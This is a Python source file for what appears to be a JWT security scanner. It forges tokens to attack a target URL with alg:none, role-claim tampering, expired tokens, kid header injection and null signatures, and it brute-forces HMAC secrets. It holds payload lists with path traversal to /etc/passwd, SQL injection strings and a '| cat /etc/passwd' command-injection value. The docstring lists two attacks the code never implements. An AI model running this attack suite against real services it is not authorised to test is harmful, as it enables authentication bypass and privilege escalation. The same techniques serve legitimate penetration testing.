"""
security/jwt.py — JWT Security Scanner
========================================
Attacks
-------
  1. alg:none          — strip signature, set algorithm to none
  2. RS256 → HS256     — use public key as HMAC secret
  3. Weak secret brute — dictionary + common secrets
  4. Expired token     — send past exp, check if server accepts
  5. Claim tampering   — flip role/admin/sub/email in payload
  6. kid injection     — path traversal + SQLi in kid header field
  7. jku/x5u spoofing  — point to attacker-controlled JWK endpoint

Usage
-----
  papister jwt <token>                     inspect only
  papister jwt <token> --attack --url <u>  full attack suite
  papister jwt <token> --brute             brute-force secret
"""

import base64
import json
import hmac
import hashlib
import time
import re
from dataclasses import dataclass, field
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

from core.runner import Runner

console = Console()

# ── Common weak secrets to try ───────────────────────────────────────────────
WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin", "test",
    "key", "jwt", "token", "pass", "mykey", "supersecret",
    "letmein", "welcome", "monkey", "dragon", "master",
    "jwtkey", "jwt_secret", "app_secret", "secret_key",
    "your-256-bit-secret", "your-secret", "change_me",
    "", "null", "undefined", "none",
]

# ── kid injection payloads ────────────────────────────────────────────────────
KID_PAYLOADS = [
    "../../dev/null",
    "../../etc/passwd",
    "/dev/null",
    "' OR 1=1--",
    "' UNION SELECT 'secret'--",
    "| cat /etc/passwd",
]


# ═══════════════════════════════════════════════════════════════════════════
#  JWT helpers
# ═══════════════════════════════════════════════════════════════════════════

def _b64_decode(s: str) -> bytes:
    """URL-safe base64 decode with padding fix."""
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _parse_token(token: str) -> tuple[dict, dict, str] | None:
    """Returns (header, payload, signature) or None."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(_b64_decode(parts[0]))
        payload = json.loads(_b64_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _build_token(header: dict, payload: dict, secret: str = "",
                 algorithm: str = "HS256") -> str:
    h = _b64_encode(json.dumps(header,  separators=(",", ":")).encode())
    p = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    if algorithm == "none" or not secret:
        return f"{h}.{p}."

    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64_encode(sig)}"


# ═══════════════════════════════════════════════════════════════════════════
#  Finding
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class JWTFinding:
    attack:     str
    severity:   str        # CRITICAL | HIGH | MEDIUM | LOW | INFO
    result:     str        # VULNERABLE | NOT_VULNERABLE | UNKNOWN
    detail:     str
    token_used: str = ""
    evidence:   str = ""


# ═══════════════════════════════════════════════════════════════════════════
#  Scanner
# ═══════════════════════════════════════════════════════════════════════════

class JWTScanner:

    def __init__(self, proxy: str | None = None, timeout: int = 15):
        self.runner  = Runner(proxy=proxy, timeout=timeout, verify_ssl=False)
        self.timeout = timeout

    # ── Inspect ─────────────────────────────────────────────────────────────

    def inspect(self, token: str):
        parsed = _parse_token(token)
        if not parsed:
            console.print("[red]✗ Not a valid JWT (expected 3 dot-separated parts)[/red]")
            return

        header, payload, sig = parsed

        # Decode exp/iat to human time
        def _ts(k):
            v = payload.get(k)
            if v:
                try:
                    return time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(v))
                except Exception:
                    return str(v)
            return "—"

        expired = ""
        if payload.get("exp"):
            if time.time() > payload["exp"]:
                expired = "  [red bold]⚠ EXPIRED[/red bold]"
            else:
                expired = "  [green]valid[/green]"

        lines = [
            f"[bold]Algorithm :[/bold]  [cyan]{header.get('alg','?')}[/cyan]"
            + ("  [red]⚠ alg:none![/red]" if str(header.get("alg","")).lower() == "none" else ""),
            f"[bold]Type      :[/bold]  {header.get('typ','?')}",
        ]
        if header.get("kid"):
            lines.append(f"[bold]kid       :[/bold]  [yellow]{header['kid']}[/yellow]  ← kid injection surface")
        if header.get("jku"):
            lines.append(f"[bold]jku       :[/bold]  [yellow]{header['jku']}[/yellow]  ← jku spoofing surface")

        lines.append("")
        lines.append(f"[bold]Subject   :[/bold]  {payload.get('sub','—')}")
        lines.append(f"[bold]Issuer    :[/bold]  {payload.get('iss','—')}")
        lines.append(f"[bold]Audience  :[/bold]  {payload.get('aud','—')}")
        lines.append(f"[bold]Role/Admin:[/bold]  {payload.get('role', payload.get('admin', payload.get('is_admin','—')))}")
        lines.append(f"[bold]Issued    :[/bold]  {_ts('iat')}")
        lines.append(f"[bold]Expires   :[/bold]  {_ts('exp')}{expired}")
        lines.append("")
        lines.append(f"[bold]Full payload:[/bold]")
        for k, v in payload.items():
            lines.append(f"  [dim]{k}[/dim] = [cyan]{v}[/cyan]")

        console.print(Panel(
            "\n".join(lines),
            title="[bold cyan]🔑 JWT Inspector[/bold cyan]",
            border_style="cyan", box=box.ROUNDED,
        ))

    # ── Attack suite ─────────────────────────────────────────────────────────

    def attack(self, token: str, url: str) -> list[JWTFinding]:
        parsed = _parse_token(token)
        if not parsed:
            console.print("[red]Invalid token[/red]"); return []

        header, payload, _ = parsed
        findings: list[JWTFinding] = []

        console.print(f"\n[cyan]⚔  JWT attack suite →[/cyan] {url}\n")

        # ── 1. alg:none ──────────────────────────────────────────────────
        console.print("  [dim]1. Testing alg:none…[/dim]")
        none_header  = {**header, "alg": "none"}
        none_token   = _build_token(none_header, payload, algorithm="none")
        r = self.runner.get(url, headers={"Authorization": f"Bearer {none_token}"})
        finding = self._eval_auth_response(
            r, attack="alg:none",
            severity="CRITICAL",
            detail="Server accepted a token with alg:none — signature not verified",
            token=none_token,
        )
        findings.append(finding)
        self._print_inline(finding)

        # ── 2. Claim tampering — role escalation ─────────────────────────
        console.print("  [dim]2. Testing claim tampering (role escalation)…[/dim]")
        tamper_candidates = [
            ("role",     "admin"),
            ("role",     "administrator"),
            ("admin",    True),
            ("is_admin", True),
            ("is_admin", 1),
            ("sub",      "1"),
            ("sub",      "admin"),
            ("group",    "admin"),
            ("scope",    "admin"),
        ]
        for claim, value in tamper_candidates:
            tampered = {**payload, claim: value}
            # Sign with empty secret — server may not verify
            tok = _build_token(header, tampered, secret="", algorithm="none")
            r   = self.runner.get(url, headers={"Authorization": f"Bearer {tok}"})
            f   = self._eval_auth_response(
                r, attack=f"claim_tamper({claim}={value})",
                severity="CRITICAL",
                detail=f"Tampered claim {claim}={value} accepted without valid signature",
                token=tok,
            )
            if f.result == "VULNERABLE":
                findings.append(f)
                self._print_inline(f)
                break   # one hit is enough to report

        # ── 3. Expired token acceptance ──────────────────────────────────
        console.print("  [dim]3. Testing expired token acceptance…[/dim]")
        if payload.get("exp"):
            old_payload = {**payload, "exp": int(time.time()) - 86400}  # 1 day ago
            old_token   = _build_token(header, old_payload, algorithm="none")
            r = self.runner.get(url, headers={"Authorization": f"Bearer {old_token}"})
            f = self._eval_auth_response(
                r, attack="expired_token",
                severity="HIGH",
                detail="Server accepted an expired token (exp in the past)",
                token=old_token,
            )
            findings.append(f)
            self._print_inline(f)

        # ── 4. kid injection ─────────────────────────────────────────────
        console.print("  [dim]4. Testing kid header injection…[/dim]")
        if header.get("kid") is not None or True:   # always test
            for kid_payload in KID_PAYLOADS:
                kid_header = {**header, "alg": "HS256", "kid": kid_payload}
                # sign with empty string — /dev/null contains empty bytes
                tok = _build_token(kid_header, payload, secret="", algorithm="HS256")
                r   = self.runner.get(url, headers={"Authorization": f"Bearer {tok}"})
                f   = self._eval_auth_response(
                    r, attack=f"kid_injection({kid_payload[:30]})",
                    severity="CRITICAL",
                    detail=f"kid path traversal/injection payload accepted: {kid_payload}",
                    token=tok,
                )
                if f.result == "VULNERABLE":
                    findings.append(f)
                    self._print_inline(f)
                    break

        # ── 5. Empty / null signature ────────────────────────────────────
        console.print("  [dim]5. Testing empty/null signature…[/dim]")
        for sig_variant in ["", "AAAA", "null"]:
            parts    = token.split(".")
            bad_tok  = f"{parts[0]}.{parts[1]}.{sig_variant}"
            r = self.runner.get(url, headers={"Authorization": f"Bearer {bad_tok}"})
            f = self._eval_auth_response(
                r, attack=f"null_sig({sig_variant or 'empty'})",
                severity="CRITICAL",
                detail="Server accepted a token with empty/null signature",
                token=bad_tok,
            )
            if f.result == "VULNERABLE":
                findings.append(f)
                self._print_inline(f)
                break

        return findings

    # ── Brute force ──────────────────────────────────────────────────────────

    def brute_force(self, token: str) -> dict:
        parsed = _parse_token(token)
        if not parsed:
            return {"found": False, "secret": None}

        header, payload, original_sig = parsed
        alg = header.get("alg", "HS256")

        if alg not in ("HS256", "HS384", "HS512"):
            console.print(f"  [yellow]Brute-force only applies to HMAC algorithms. Got: {alg}[/yellow]")
            return {"found": False, "secret": None, "alg": alg}

        hash_fn = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }[alg]

        parts  = token.split(".")
        si     = f"{parts[0]}.{parts[1]}".encode()

        console.print(f"\n[cyan]🔑 Brute-forcing JWT secret ({len(WEAK_SECRETS)} candidates)…[/cyan]\n")

        for secret in WEAK_SECRETS:
            sig_check = _b64_encode(
                hmac.new(secret.encode(), si, hash_fn).digest()
            )
            if sig_check == original_sig:
                console.print(f"  [bold red]🔓 SECRET FOUND: '{secret}'[/bold red]")
                return {"found": True, "secret": secret, "alg": alg}

        console.print("  [green]✓ No weak secret found in dictionary.[/green]")
        return {"found": False, "secret": None, "alg": alg}

    # ── Token extractor ──────────────────────────────────────────────────────

    def extract_token_from_url(self, url: str) -> str | None:
        """Fire a GET request and look for JWTs in response headers + body."""
        r = self.runner.get(url)
        # Check Authorization header echo, Set-Cookie, body
        sources = list(r.headers.values()) + [r.body or ""]
        jwt_re  = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
        for s in sources:
            m = jwt_re.search(str(s))
            if m:
                return m.group(0)
        return None

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _eval_auth_response(self, r, attack, severity, detail, token="") -> JWTFinding:
        if r.error or r.timed_out:
            return JWTFinding(attack=attack, severity=severity,
                              result="UNKNOWN", detail=detail,
                              token_used=token[:80],
                              evidence=f"Request failed: {r.error}")
        if r.status_code in (200, 201):
            return JWTFinding(attack=attack, severity=severity,
                              result="VULNERABLE", detail=detail,
                              token_used=token[:80],
                              evidence=f"Got {r.status_code} — server accepted the manipulated token")
        return JWTFinding(attack=attack, severity=severity,
                          result="NOT_VULNERABLE", detail=detail,
                          token_used=token[:80],
                          evidence=f"Got {r.status_code} — rejected correctly")

    def _print_inline(self, f: JWTFinding):
        color = {"VULNERABLE":"red","NOT_VULNERABLE":"green","UNKNOWN":"yellow"}.get(f.result,"white")
        icon  = {"VULNERABLE":"⚠","NOT_VULNERABLE":"✓","UNKNOWN":"?"}.get(f.result,"·")
        console.print(
            f"    [{color}]{icon} {f.result:<16}[/{color}]  "
            f"[dim]{f.attack}[/dim]"
        )

    # ── Print all findings ────────────────────────────────────────────────────

    def print_findings(self, findings: list[JWTFinding]):
        vulns = [f for f in findings if f.result == "VULNERABLE"]
        console.print()
        if not vulns:
            console.print("[green]✓ No JWT vulnerabilities detected.[/green]")
            return
        console.print(f"[bold red]⚠ {len(vulns)} JWT vulnerability/vulnerabilities found:[/bold red]\n")
        t = Table("Attack","Severity","Evidence",
                  box=box.ROUNDED, header_style="bold red", show_lines=True)
        for f in vulns:
            sc = {"CRITICAL":"red","HIGH":"red","MEDIUM":"yellow","LOW":"dim"}.get(f.severity,"white")
            t.add_row(
                f"[bold]{f.attack}[/bold]",
                f"[{sc}]{f.severity}[/{sc}]",
                f.evidence[:100],
            )
        console.print(t)

    def print_brute_result(self, result: dict):
        if result.get("found"):
            console.print(Panel(
                f"[bold red]🔓 Weak secret found: '{result['secret']}'[/bold red]\n"
                f"[dim]Algorithm: {result.get('alg','?')}[/dim]\n\n"
                f"[dim]An attacker can forge any token with this secret.[/dim]",
                border_style="red", box=box.ROUNDED,
                title="JWT Secret Cracked",
            ))
        else:
            console.print("[green]✓ Secret not in weak dictionary.[/green]")

    def close(self):
        self.runner.close()
